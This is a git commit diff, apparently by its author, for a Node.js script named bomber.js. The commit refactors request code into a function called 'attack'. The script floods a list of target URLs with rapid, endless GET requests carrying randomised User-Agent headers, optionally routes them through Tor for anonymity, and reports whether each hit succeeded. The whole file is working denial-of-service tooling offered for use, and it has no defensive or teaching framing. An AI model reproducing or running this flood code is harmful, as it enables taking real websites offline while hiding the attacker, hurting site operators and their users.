2c0b959e77ea68aa42f7d99640254addc567a586
Dima <zgltyq@gmail.com>
2022-03-26 17:20:37 +0200

    add method

--- bomber.js
+++ bomber.js
@@ -1,5 +1,5 @@
 const proxy =         require('tor-request');
-const request =     require('request');     
+const request =       require('request');     
 const randomUseragent = require('random-useragent');
 const {
      parentPort, workerData
@@ -7,34 +7,29 @@ const {
 const { urls, tor } = workerData;
 
 
+const attack = (method, url) => {
+    method({
+        url,
+        method: 'GET',
+        headers: {
+            'User-Agent': randomUseragent.getRandom()
+        }
+    }, (err, res) => {
+        if (err) return parentPort.postMessage({ url, success: 'unsuccessfully' });
+        if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({ url, success: 'successfully' });
+    });
+}
+
 if (tor) {
     setInterval(() => {
         urls.forEach(url => {
-            proxy.request({
-                url,
-                method: 'GET',
-                headers: {
-                    'User-Agent': randomUseragent.getRandom()
-                }
-            }, (err, res) => {
-                if (err) return parentPort.postMessage({url, success: 'unsuccessfully'});
-                if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({url, success: 'successfully'});
-            })
+            attack(proxy.request, url);
         });
     });
 } else {
     setInterval(() => {
         urls.forEach(url => {
-            request({
-                url,
-                method: 'GET',
-                headers: {
-                    'User-Agent': randomUseragent.getRandom()
-                }
-            }, (err, res) => {
-                if (err) return parentPort.postMessage({url, success: 'unsuccessfully'});
-                if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({url, success: 'successfully'});
-            })
+            attack(request, url);
         });
     });
 }
